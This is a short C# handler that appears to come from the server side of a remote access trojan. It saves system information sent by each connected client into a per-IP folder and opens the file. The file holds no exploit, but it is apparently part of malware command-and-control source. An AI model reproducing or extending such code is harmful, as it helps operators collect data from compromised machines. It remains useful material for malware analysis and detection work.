using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;

namespace Server.Handle_Packet;

public class HandleInformation
{
	public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.Ip + "\\Information");
			string text2 = text + "\\Information.txt";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			File.WriteAllText(text2, unpack_msgpack.ForcePathObject("InforMation").AsString);
			Process.Start("explorer.exe", text2);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}
}
